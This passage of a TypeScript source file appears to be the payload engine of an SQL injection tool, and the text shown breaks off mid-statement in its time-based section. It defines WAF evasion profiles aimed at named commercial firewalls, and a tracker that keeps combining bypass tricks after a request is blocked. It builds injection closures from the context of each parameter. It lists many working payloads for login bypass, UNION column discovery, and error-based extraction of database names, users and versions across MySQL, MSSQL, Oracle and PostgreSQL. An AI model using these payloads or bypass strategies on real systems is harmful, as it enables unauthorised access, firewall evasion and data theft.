export type PayloadCategory = 
  | "auth_bypass" 
  | "union_discovery" 
  | "error_based" 
  | "time_based" 
  | "boolean_based"
  | "stacked_query"
  | "second_order"
  | "verbose_error";

export type DatabaseType = "mysql" | "postgresql" | "mssql" | "oracle" | "sqlite" | "generic";

export type ContextType = "numeric" | "string" | "json" | "parentheses_single" | "parentheses_double" | "double_quote" | "unknown";

export interface ContextAnalysis {
  type: ContextType;
  prefix: string;
  suffix: string;
  closures: string[];
  isNumeric: boolean;
  isQuoted: boolean;
  quoteChar: "'" | '"' | null;
  parenthesesDepth: number;
  jsonContext: boolean;
}

export interface Payload {
  id: string;
  category: PayloadCategory;
  template: string;
  databases: DatabaseType[];
  description: string;
  riskLevel: "low" | "medium" | "high";
  expectedBehavior: string;
  contextPrefixes?: string[];
}

export interface TampingStrategy {
  name: string;
  description: string;
  transform: (payload: string) => string;
}

export type TampingStrategyName = 
  | "unicode"
  | "double_encode"
  | "comment_split"
  | "case_folding"
  | "null_byte"
  | "hex_encode"
  | "space_replacement"
  | "bracket_spacing"
  | "chunk_encoding"
  | "wildcard_insert"
  | "version_comment";

export interface WAFTampingProfile {
  strategies: TampingStrategyName[];
  description: string;
}

export const WAF_TAMPING_PROFILES: Record<string, WAFTampingProfile> = {
  cloudflare: {
    strategies: ["unicode", "double_encode", "comment_split", "case_folding"],
    description: "Cloudflare WAF bypass profile"
  },
  aws_waf: {
    strategies: ["double_encode", "unicode", "null_byte", "comment_split"],
    description: "AWS WAF bypass profile"
  },
  modsecurity: {
    strategies: ["comment_split", "case_folding", "hex_encode", "space_replacement"],
    description: "ModSecurity bypass profile"
  },
  imperva: {
    strategies: ["unicode", "hex_encode", "bracket_spacing", "case_folding"],
    description: "Imperva/Incapsula bypass profile"
  },
  akamai: {
    strategies: ["hex_encode", "unicode", "double_encode", "chunk_encoding"],
    description: "Akamai bypass profile"
  },
  sucuri: {
    strategies: ["double_encode", "unicode", "comment_split", "wildcard_insert"],
    description: "Sucuri bypass profile"
  },
  f5_bigip: {
    strategies: ["unicode", "hex_encode", "double_encode", "version_comment"],
    description: "F5 BIG-IP bypass profile"
  },
  wordfence: {
    strategies: ["comment_split", "unicode", "case_folding", "wildcard_insert"],
    description: "Wordfence bypass profile"
  },
  barracuda: {
    strategies: ["unicode", "double_encode", "null_byte", "case_folding"],
    description: "Barracuda bypass profile"
  },
  fortiweb: {
    strategies: ["hex_encode", "comment_split", "version_comment", "unicode"],
    description: "FortiWeb bypass profile"
  },
  generic: {
    strategies: ["unicode", "double_encode", "comment_split", "case_folding", "null_byte", "hex_encode", "space_replacement", "bracket_spacing", "chunk_encoding", "wildcard_insert", "version_comment"],
    description: "Generic WAF bypass profile - cycles through all strategies"
  }
};

export interface DynamicTampingState {
  currentIndex: number;
  failedStrategies: Set<string>;
  attemptCount: number;
  lastStrategy: string | null;
  combinationMode: boolean;
}

export class DynamicTampingTracker {
  private stateByWAF: Map<string, DynamicTampingState> = new Map();
  private combinationThreshold: number = 4;

  getOrCreateState(wafVendor: string): DynamicTampingState {
    const normalizedVendor = wafVendor.toLowerCase().replace(/[^a-z0-9_]/g, "_");
    if (!this.stateByWAF.has(normalizedVendor)) {
      this.stateByWAF.set(normalizedVendor, {
        currentIndex: 0,
        failedStrategies: new Set(),
        attemptCount: 0,
        lastStrategy: null,
        combinationMode: false
      });
    }
    return this.stateByWAF.get(normalizedVendor)!;
  }

  recordBlock(wafVendor: string): void {
    const state = this.getOrCreateState(wafVendor);
    state.attemptCount++;
    if (state.lastStrategy) {
      state.failedStrategies.add(state.lastStrategy);
    }
    const profile = WAF_TAMPING_PROFILES[wafVendor.toLowerCase()] || WAF_TAMPING_PROFILES.generic;
    state.currentIndex = (state.currentIndex + 1) % profile.strategies.length;
    if (state.attemptCount >= this.combinationThreshold && !state.combinationMode) {
      state.combinationMode = true;
      state.currentIndex = 0;
    }
  }

  recordSuccess(wafVendor: string): void {
    const state = this.getOrCreateState(wafVendor);
    state.attemptCount = Math.max(0, state.attemptCount - 1);
    state.failedStrategies.clear();
  }

  getDynamicTamping(wafVendor: string, attemptNumber: number): TampingStrategyName[] {
    const normalizedVendor = wafVendor.toLowerCase().replace(/[^a-z0-9_]/g, "_");
    const profile = WAF_TAMPING_PROFILES[normalizedVendor] || WAF_TAMPING_PROFILES.generic;
    const state = this.getOrCreateState(normalizedVendor);
    
    if (state.combinationMode || attemptNumber >= this.combinationThreshold) {
      const combinations = this.generateCombinations(profile.strategies);
      const comboIndex = (attemptNumber - this.combinationThreshold) % combinations.length;
      const combo = combinations[Math.max(0, comboIndex)];
      state.lastStrategy = combo.join("+");
      return combo;
    }
    
    const strategyIndex = attemptNumber % profile.strategies.length;
    const strategy = profile.strategies[strategyIndex];
    state.lastStrategy = strategy;
    return [strategy];
  }

  private generateCombinations(strategies: TampingStrategyName[]): TampingStrategyName[][] {
    const combinations: TampingStrategyName[][] = [];
    for (let i = 0; i < strategies.length; i++) {
      for (let j = i + 1; j < strategies.length; j++) {
        combinations.push([strategies[i], strategies[j]]);
      }
    }
    for (let i = 0; i < Math.min(strategies.length, 3); i++) {
      for (let j = i + 1; j < Math.min(strategies.length, 4); j++) {
        for (let k = j + 1; k < Math.min(strategies.length, 5); k++) {
          combinations.push([strategies[i], strategies[j], strategies[k]]);
        }
      }
    }
    return combinations;
  }

  getState(wafVendor: string): DynamicTampingState | undefined {
    const normalizedVendor = wafVendor.toLowerCase().replace(/[^a-z0-9_]/g, "_");
    return this.stateByWAF.get(normalizedVendor);
  }

  resetState(wafVendor: string): void {
    const normalizedVendor = wafVendor.toLowerCase().replace(/[^a-z0-9_]/g, "_");
    this.stateByWAF.delete(normalizedVendor);
  }

  getAllStates(): Map<string, DynamicTampingState> {
    return new Map(this.stateByWAF);
  }
}

export const dynamicTampingTracker = new DynamicTampingTracker();

export class ContextAnalyzer {
  static analyzeParameter(value: string, paramName: string): ContextAnalysis {
    const isNumeric = /^\d+$/.test(value);
    const isJson = this.looksLikeJson(value);
    const quoteAnalysis = this.detectQuoteContext(value, paramName);
    
    let type: ContextType = "unknown";
    let prefix = "";
    let suffix = "";
    let closures: string[] = [];
    
    if (isNumeric) {
      type = "numeric";
      closures = ["", ")", "))", ")))", " AND 1=1", " OR 1=1"];
      prefix = "";
    } else if (isJson) {
      type = "json";
      closures = ["}", "}}", "\"}", "\"}}", "]}"];
      prefix = "";
    } else if (quoteAnalysis.quoteChar === '"') {
      type = "double_quote";
      closures = ["\"", "\")", "\"))", "\" AND \"1\"=\"1", "\" OR \"1\"=\"1"];
      prefix = "\"";
    } else {
      type = "string";
      closures = ["'", "')", "'))", "')) ", "' AND '1'='1", "' OR '1'='1"];
      prefix = "'";
    }
    
    const parenthesesDepth = this.detectParenthesesDepth(paramName, value);
    if (parenthesesDepth === 1) {
      type = "parentheses_single";
      closures = isNumeric 
        ? [")", ") AND 1=1", ") OR 1=1--", ")--"]
        : ["')", "') AND '1'='1", "') OR '1'='1--", "')--"];
    } else if (parenthesesDepth >= 2) {
      type = "parentheses_double";
      closures = isNumeric
        ? ["))", ")) AND 1=1", ")) OR 1=1--", "))--"]
        : ["'))", "')) AND '1'='1", "')) OR '1'='1--", "'))--"];
    }
    
    return {
      type,
      prefix,
      suffix,
      closures,
      isNumeric,
      isQuoted: !isNumeric && !isJson,
      quoteChar: quoteAnalysis.quoteChar,
      parenthesesDepth,
      jsonContext: isJson
    };
  }
  
  private static looksLikeJson(value: string): boolean {
    if (value.startsWith("{") || value.startsWith("[") || value.startsWith("\"")) {
      try {
        JSON.parse(value);
        return true;
      } catch {
        return value.includes(":") && (value.includes("{") || value.includes("["));
      }
    }
    return false;
  }
  
  private static detectQuoteContext(value: string, paramName: string): { quoteChar: "'" | '"' | null } {
    if (value.startsWith('"') || value.endsWith('"')) {
      return { quoteChar: '"' };
    }
    if (value.includes('"') && !value.includes("'")) {
      return { quoteChar: '"' };
    }
    return { quoteChar: "'" };
  }
  
  private static detectParenthesesDepth(paramName: string, value: string): number {
    const openParens = (value.match(/\(/g) || []).length;
    const closeParens = (value.match(/\)/g) || []).length;
    const imbalance = Math.max(0, openParens - closeParens);
    
    if (imbalance === 0 && value.includes("(") && value.includes(")")) {
      return 0;
    }
    return imbalance;
  }
  
  static generateContextAwarePrefixes(context: ContextAnalysis): string[] {
    const prefixes: string[] = [];
    
    if (context.isNumeric) {
      prefixes.push("", "1", "1 ", "-1", "0", "1)", "1))", "1)))");
    } else if (context.type === "double_quote") {
      prefixes.push("\"", "\" ", "\")", "\"))", "\")))", "\" AND \"", "\" OR \"");
    } else if (context.type === "json") {
      prefixes.push("}", "}}", "\",\"", "\":\"", "]}");
    } else {
      prefixes.push("'", "' ", "')", "'))", "')))", "' AND '", "' OR '");
    }
    
    for (const closure of context.closures) {
      if (!prefixes.includes(closure)) {
        prefixes.push(closure);
      }
    }
    
    return prefixes;
  }
}

export class GlobalPayloadRepository {
  private payloads: Payload[] = [];
  private tampingStrategies: TampingStrategy[] = [];
  
  constructor() {
    this.initializeAuthBypassSuite();
    this.initializeUnionDiscoverySuite();
    this.initializeErrorBasedSuite();
    this.initializeVerboseErrorSuite();
    this.initializeTimeBasedSuite();
    this.initializeBooleanBasedSuite();
    this.initializeStackedQuerySuite();
    this.initializeSecondOrderSuite();
    this.initializeTampingStrategies();
  }

  private initializeAuthBypassSuite(): void {
    const authPayloads: Omit<Payload, "id">[] = [
      { category: "auth_bypass", template: "' OR '1'='1' --", databases: ["generic"], description: "Classic OR bypass with string equality", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "' OR '1'='1'/*", databases: ["generic"], description: "OR bypass with block comment terminator", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "\" OR 1=1 #", databases: ["mysql"], description: "Double quote OR bypass with hash comment", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "\" OR 1=1 --", databases: ["generic"], description: "Double quote OR bypass with line comment", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "admin'--", databases: ["generic"], description: "Admin user bypass with comment", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "admin' #", databases: ["mysql"], description: "Admin user bypass with hash comment", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "' OR 1=1--", databases: ["generic"], description: "Simple OR bypass no spaces", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "' OR ''='", databases: ["generic"], description: "Empty string equality bypass", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "') OR ('1'='1", databases: ["generic"], description: "Parenthesis OR bypass", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "')) OR (('1'='1", databases: ["generic"], description: "Double parenthesis OR bypass", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "' OR 1=1 OR '1'='1", databases: ["generic"], description: "Chained OR bypass", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "1' OR '1'='1' --", databases: ["generic"], description: "Numeric prefix OR bypass", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "' OR 'x'='x", databases: ["generic"], description: "Character equality bypass", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "' AND 1=0 UNION SELECT 'admin','admin'--", databases: ["generic"], description: "Union-based auth bypass", riskLevel: "high", expectedBehavior: "Auth bypass" },
      { category: "auth_bypass", template: "'-'", databases: ["generic"], description: "Subtraction character probe", riskLevel: "low", expectedBehavior: "Error or different response" },
      { category: "auth_bypass", template: "' '", databases: ["generic"], description: "Space injection probe", riskLevel: "low", expectedBehavior: "Error or different response" },
      { category: "auth_bypass", template: "'&'", databases: ["generic"], description: "Ampersand injection probe", riskLevel: "low", expectedBehavior: "Error or different response" },
      { category: "auth_bypass", template: "'^'", databases: ["generic"], description: "XOR operator probe", riskLevel: "low", expectedBehavior: "Error or different response" },
      { category: "auth_bypass", template: "'*'", databases: ["generic"], description: "Multiplication probe", riskLevel: "low", expectedBehavior: "Error or different response" },
      { category: "auth_bypass", template: "' OR id IS NOT NULL OR 'x'='y", databases: ["generic"], description: "NOT NULL OR bypass", riskLevel: "high", expectedBehavior: "Auth bypass" },
    ];

    authPayloads.forEach((p, i) => {
      this.payloads.push({ ...p, id: `auth_${i + 1}` });
    });
  }

  private initializeUnionDiscoverySuite(): void {
    const unionPayloads: Omit<Payload, "id">[] = [];
    
    for (let cols = 1; cols <= 20; cols++) {
      const nulls = Array(cols).fill("NULL").join(",");
      const strings = Array(cols).fill("'a'").join(",");
      const numbers = Array.from({ length: cols }, (_, i) => i + 1).join(",");
      
      unionPayloads.push({
        category: "union_discovery",
        template: `' UNION SELECT ${nulls}--`,
        databases: ["generic"],
        description: `UNION with ${cols} NULL columns`,
        riskLevel: "medium",
        expectedBehavior: "Column count match"
      });
      
      unionPayloads.push({
        category: "union_discovery",
        template: `' UNION SELECT ${strings}--`,
        databases: ["generic"],
        description: `UNION with ${cols} string columns`,
        riskLevel: "medium",
        expectedBehavior: "Column count match with strings"
      });

      unionPayloads.push({
        category: "union_discovery",
        template: `' UNION ALL SELECT ${nulls}--`,
        databases: ["generic"],
        description: `UNION ALL with ${cols} NULL columns`,
        riskLevel: "medium",
        expectedBehavior: "Column count match"
      });

      if (cols <= 10) {
        unionPayloads.push({
          category: "union_discovery",
          template: `' ORDER BY ${cols}--`,
          databases: ["generic"],
          description: `ORDER BY ${cols} column count probe`,
          riskLevel: "low",
          expectedBehavior: "Column count detection"
        });
      }
    }

    unionPayloads.push({
      category: "union_discovery",
      template: "' UNION SELECT @@version--",
      databases: ["mysql", "mssql"],
      description: "Version extraction",
      riskLevel: "high",
      expectedBehavior: "Database version disclosure"
    });

    unionPayloads.push({
      category: "union_discovery",
      template: "' UNION SELECT version()--",
      databases: ["postgresql"],
      description: "PostgreSQL version extraction",
      riskLevel: "high",
      expectedBehavior: "Database version disclosure"
    });

    unionPayloads.push({
      category: "union_discovery",
      template: "' UNION SELECT sqlite_version()--",
      databases: ["sqlite"],
      description: "SQLite version extraction",
      riskLevel: "high",
      expectedBehavior: "Database version disclosure"
    });

    unionPayloads.forEach((p, i) => {
      this.payloads.push({ ...p, id: `union_${i + 1}` });
    });
  }

  private initializeErrorBasedSuite(): void {
    const errorPayloads: Omit<Payload, "id">[] = [
      { category: "error_based", template: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", databases: ["mysql"], description: "MySQL error-based with FLOOR()", riskLevel: "high", expectedBehavior: "Database name in error" },
      { category: "error_based", template: "' AND extractvalue(1,concat(0x7e,(SELECT database())))--", databases: ["mysql"], description: "MySQL extractvalue error injection", riskLevel: "high", expectedBehavior: "Database name in error" },
      { category: "error_based", template: "' AND updatexml(1,concat(0x7e,(SELECT database())),1)--", databases: ["mysql"], description: "MySQL updatexml error injection", riskLevel: "high", expectedBehavior: "Database name in error" },
      { category: "error_based", template: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", databases: ["mysql"], description: "MySQL error-based user extraction", riskLevel: "high", expectedBehavior: "User in error" },
      { category: "error_based", template: "' AND exp(~(SELECT * FROM (SELECT user())x))--", databases: ["mysql"], description: "MySQL exp() error injection", riskLevel: "high", expectedBehavior: "User in error" },
      
      { category: "error_based", template: "' AND 1=CAST((SELECT version()) AS int)--", databases: ["postgresql"], description: "PostgreSQL CAST error injection", riskLevel: "high", expectedBehavior: "Version in error" },
      { category: "error_based", template: "'::int", databases: ["postgresql"], description: "PostgreSQL type cast error probe", riskLevel: "medium", expectedBehavior: "Type cast error" },
      { category: "error_based", template: "' AND 1=CAST((SELECT current_database()) AS int)--", databases: ["postgresql"], description: "PostgreSQL database name extraction", riskLevel: "high", expectedBehavior: "Database name in error" },
      { category: "error_based", template: "' AND 1=CAST((SELECT current_user) AS int)--", databases: ["postgresql"], description: "PostgreSQL user extraction", riskLevel: "high", expectedBehavior: "User in error" },
      { category: "error_based", template: "'||(SELECT ''||version())||'", databases: ["postgresql"], description: "PostgreSQL concatenation error", riskLevel: "medium", expectedBehavior: "Version disclosure" },
      
      { category: "error_based", template: "' AND 1=CONVERT(int,(SELECT @@version))--", databases: ["mssql"], description: "MSSQL CONVERT error injection", riskLevel: "high", expectedBehavior: "Version in error" },
      { category: "error_based", template: "' AND 1=CONVERT(int,(SELECT DB_NAME()))--", databases: ["mssql"], description: "MSSQL database name extraction", riskLevel: "high", expectedBehavior: "Database name in error" },
      { category: "error_based", template: "' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--", databases: ["mssql"], description: "MSSQL user extraction", riskLevel: "high", expectedBehavior: "User in error" },
      { category: "error_based", template: "';DECLARE @v varchar(8000)=@@version;RAISERROR(@v,16,1)--", databases: ["mssql"], description: "MSSQL RAISERROR version disclosure", riskLevel: "high", expectedBehavior: "Version in error" },
      
      { category: "error_based", template: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--", databases: ["oracle"], description: "Oracle UTL_INADDR error injection", riskLevel: "high", expectedBehavior: "User in error" },
      { category: "error_based", template: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--", databases: ["oracle"], description: "Oracle CTXSYS error injection", riskLevel: "high", expectedBehavior: "User in error" },
      { category: "error_based", template: "' AND 1=DBMS_XDB_VERSION.CHECKIN((SELECT user FROM dual))--", databases: ["oracle"], description: "Oracle DBMS_XDB error injection", riskLevel: "high", expectedBehavior: "User in error" },
      
      { category: "error_based", template: "'", databases: ["generic"], description: "Single quote syntax error probe", riskLevel: "low", expectedBehavior: "SQL syntax error" },
      { category: "error_based", template: "\"", databases: ["generic"], description: "Double quote syntax error probe", riskLevel: "low", expectedBehavior: "SQL syntax error" },
      { category: "error_based", template: "\\", databases: ["generic"], description: "Backslash escape error probe", riskLevel: "low", expectedBehavior: "SQL syntax error" },
      { category: "error_based", template: "' AND 1=1/0--", databases: ["generic"], description: "Division by zero error probe", riskLevel: "medium", expectedBehavior: "Division by zero error" },
      { category: "error_based", template: "1/0", databases: ["generic"], description: "Numeric division by zero", riskLevel: "low", expectedBehavior: "Division error" },
    ];

    errorPayloads.forEach((p, i) => {
      this.payloads.push({ ...p, id: `error_${i + 1}` });
    });
  }

  private initializeVerboseErrorSuite(): void {
    const verbosePayloads: Omit<Payload, "id">[] = [];
    
    const mysqlVerbosePayloads = [
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))--",
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))--",
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e))--",
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT column_name FROM information_schema.columns LIMIT 1),0x7e))--",
      "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",
      "' AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)--",
      "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)--",
      "' AND UPDATEXML(1,CONCAT(0x7e,@@hostname,0x7e),1)--",
      "' AND UPDATEXML(1,CONCAT(0x7e,@@datadir,0x7e),1)--",
      "' AND UPDATEXML(1,CONCAT(0x7e,@@basedir,0x7e),1)--",
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(USER(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(DATABASE(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(table_name) FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
      "' AND EXP(~(SELECT * FROM(SELECT VERSION())a))--",
      "' AND EXP(~(SELECT * FROM(SELECT USER())a))--",
      "' AND EXP(~(SELECT * FROM(SELECT DATABASE())a))--",
      "' AND GTID_SUBSET(VERSION(),1)--",
      "' AND GTID_SUBSET(USER(),1)--",
      "' AND GTID_SUBSET(DATABASE(),1)--",
      "' AND JSON_KEYS((SELECT CONVERT((SELECT VERSION()) USING utf8)))--",
      "' AND ST_LatFromGeoHash(VERSION())--",
      "' AND ST_LongFromGeoHash(VERSION())--",
      "' AND ST_PointFromGeoHash(VERSION(),1)--",
      "' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT VERSION())a)b))--",
      "' AND LINESTRING((SELECT * FROM(SELECT VERSION())a))--",
      "' AND MULTIPOINT((SELECT * FROM(SELECT VERSION())a))--",
      "' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT VERSION())a))--",
      "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,VERSION())),1)--",
      "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--",
      "' AND (SELECT * FROM (SELECT NAME_CONST(VERSION(),1),NAME_CONST(VERSION(),1))a)--",
      "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
      "1 AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
      "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ];
    
    for (const template of mysqlVerbosePayloads) {
      verbosePayloads.push({
        category: "verbose_error",
        template,
        databases: ["mysql"],
        description: "MySQL verbose error extraction",
        riskLevel: "high",
        expectedBehavior: "Data in error message"
      });
    }
    
    const mssqlVerbosePayloads = [
      "' AND 1=CONVERT(int,@@VERSION)--",
      "' AND 1=CONVERT(int,DB_NAME())--",
      "' AND 1=CONVERT(int,SYSTEM_USER)--",
      "' AND 1=CONVERT(int,USER_NAME())--",
      "' AND 1=CONVERT(int,SUSER_NAME())--",
      "' AND 1=CONVERT(int,HOST_NAME())--",
      "' AND 1=CONVERT(int,@@SERVERNAME)--",
      "' AND 1=CONVERT(int,@@SERVICENAME)--",
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--",
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM syscolumns))--",
      "'; DECLARE @v varchar(8000)=@@VERSION; RAISERROR(@v,16,1)--",
      "'; DECLARE @v varchar(8000)=DB_NAME(); RAISERROR(@v,16,1)--",
      "'; DECLARE @v varchar(8000)=SYSTEM_USER; RAISERROR(@v,16,1)--",
      "'; DECLARE @v varchar(8000)=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'); RAISERROR(@v,16,1)--",
      "' AND 1=(SELECT CAST(@@VERSION AS int))--",
      "' AND 1=(SELECT CAST(DB_NAME() AS int))--",
      "' HAVING 1=1--",
      "' GROUP BY columnname HAVING 1=1--",
      "' AND 1=(SELECT @@VERSION WHERE 1=CAST(@@VERSION AS int))--",
      "' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM master..sysdatabases))--",
      "1 AND 1=CONVERT(int,@@VERSION)--",
      "1 AND 1=CONVERT(int,DB_NAME())--",
      "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
      "1; DECLARE @v varchar(8000)=@@VERSION; RAISERROR(@v,16,1)--",
      "') AND 1=CONVERT(int,@@VERSION)--",
      "')) AND 1=CONVERT(int,@@VERSION)--",
      "\" AND 1=CONVERT(int,@@VERSION)--",
      "\") AND 1=CONVERT(int,@@VERSION)--",
    ];
    
    for (const template of mssqlVerbosePayloads) {
      verbosePayloads.push({
        category: "verbose_error",
        template,
        databases: ["mssql"],
        description: "MSSQL verbose error extraction",
        riskLevel: "high",
        expectedBehavior: "Data in error message"
      });
    }
    
    const oracleVerbosePayloads = [
      "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
      "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT SYS.DATABASE_NAME FROM dual))--",
      "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--",
      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT SYS.DATABASE_NAME FROM dual))--",
      "' AND 1=DBMS_XDB_VERSION.CHECKIN((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=DBMS_XDB_VERSION.MAKEVERSIONED((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=DBMS_XDB_VERSION.UNCHECKOUT((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),1,1)--",
      "' AND 1=SYS.DBMS_CDC_IPUBLISH.GET_SCN((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=SDO_UTIL.TO_WKBGEOMETRY((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND 1=TO_DATE((SELECT banner FROM v$version WHERE ROWNUM=1))--",
      "' AND EXTRACTVALUE(XMLType('<root>'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'</root>'),'/root')=1--",
      "' AND XMLType('<root>'||(SELECT user FROM dual)||'</root>').getStringVal()=1--",
      "' OR 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
      "1 AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
      "1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--",
      "') AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
      "')) AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
      "\" AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--",
    ];
    
    for (const template of oracleVerbosePayloads) {
      verbosePayloads.push({
        category: "verbose_error",
        template,
        databases: ["oracle"],
        description: "Oracle verbose error extraction",
        riskLevel: "high",
        expectedBehavior: "Data in error message"
      });
    }
    
    const genericVerbosePayloads = [
      "'",
      "\"",
      "\\",
      "'--",
      "\"--",
      "'#",
      "\"#",
      "';--",
      "\";--",
      "' AND 1=1/0--",
      "\" AND 1=1/0--",
      "1/0",
      "' AND CONV('a',16,2)--",
      "' AND CHAR(65,66,67)--",
      "')--",
      "'))--",
      "')))--",
      "\")--",
      "\"))--",
      "\")))--",
      "' OR 1=1--",
      "\" OR 1=1--",
      "1 OR 1=1--",
      "' OR 'x'='x'--",
      "\" OR \"x\"=\"x\"--",
    ];
    
    for (const template of genericVerbosePayloads) {
      verbosePayloads.push({
        category: "verbose_error",
        template,
        databases: ["generic"],
        description: "Generic verbose error probe",
        riskLevel: "medium",
        expectedBehavior: "SQL syntax error"
      });
    }
    
    verbosePayloads.forEach((p, i) => {
      this.payloads.push({ ...p, id: `verbose_${i + 1}` });
    });
  }

  private initializeTimeBasedSuite(): void {
    const delays = [2, 3, 5, 8, 10];
    const timePayloads: Omit<Payload, "id">[] = [];

    for (const delay of delays) {
      timePayloads.push({
        category: "time_based",
        template: `' AND SLEEP(${delay})--`,
        databases: ["mysql"],
        description: `MySQL SLEEP ${delay}s`,
        riskLevel: "medium",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `' OR SLEEP(${delay})--`,
        databases: ["mysql"],
        description: `MySQL SLEEP ${delay}s (OR variant)`,
        riskLevel: "medium",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `' AND (SELECT SLEEP(${delay}))--`,
        databases: ["mysql"],
        description: `MySQL subquery SLEEP ${delay}s`,
        riskLevel: "medium",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `'; SELECT SLEEP(${delay});--`,
        databases: ["mysql"],
        description: `MySQL stacked SLEEP ${delay}s`,
        riskLevel: "high",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `' AND pg_sleep(${delay})--`,
        databases: ["postgresql"],
        description: `PostgreSQL pg_sleep ${delay}s`,
        riskLevel: "medium",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `' OR pg_sleep(${delay})--`,
        databases: ["postgresql"],
        description: `PostgreSQL pg_sleep ${delay}s (OR variant)`,
        riskLevel: "medium",
        expectedBehavior: `${delay}s delay`
      });

      timePayloads.push({
        category: "time_based",
        template: `'; SELECT pg_sleep(${delay});--`,
